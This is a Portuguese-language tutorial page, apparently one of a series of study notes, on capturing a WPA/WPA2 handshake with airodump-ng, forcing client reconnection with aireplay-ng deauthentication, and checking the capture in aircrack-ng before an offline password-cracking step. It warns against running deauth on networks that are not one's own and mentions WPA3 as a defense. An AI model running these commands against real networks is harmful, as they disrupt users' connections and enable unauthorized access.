# 04 — Capturar o handshake WPA/WPA2

[[00-INDICE|⬅ Voltar ao índice]]

O handshake (4-way) acontece quando um cliente **se conecta** ao AP. Para capturá-lo você precisa estar escutando o canal certo no momento em que alguém conecta — ou **forçar** uma reconexão (deauth).

## Passo 1: ficar escutando o alvo

```bash
sudo airodump-ng --bssid AA:BB:CC:11:22:33 --channel 6 --write captura wlan0mon
```

Deixe essa janela aberta. Quando o handshake for capturado, aparece no topo:

```
[ WPA handshake: AA:BB:CC:11:22:33 ]
```

## Passo 2 (opcional): forçar reconexão com deauth

Em **outra janela**, desconecte um cliente para ele reconectar e gerar o handshake.

```bash
# -0 = deauth, 5 = qtd de pacotes, -a = AP, -c = cliente alvo
sudo aireplay-ng -0 5 -a AA:BB:CC:11:22:33 -c 99:88:77:66:55:44 wlan0mon
```

> [!tip] Mande poucos pacotes
> 3 a 5 deauths bastam. Mandar centenas só derruba a rede (DoS) e não ajuda. O objetivo é só fazer **um** cliente reconectar.

> [!warning] Deauth derruba conexões reais
> Só faça em rede própria/autorizada. Em ambiente real isso interrompe quem está usando a internet.

## Passo 3: validar a captura

```bash
aircrack-ng captura-01.cap
```

Deve listar a rede com `(1 handshake)`. Se não tiver handshake, repita a escuta/deauth.

> [!note] WPA3 não cai aqui
> O ataque de handshake offline funciona em **WPA/WPA2-PSK**. O WPA3 (SAE) resiste — por isso é recomendado. Veja [[09-defesa]].

➡️ Com o handshake na mão, vá para [[05-quebra-senha]].
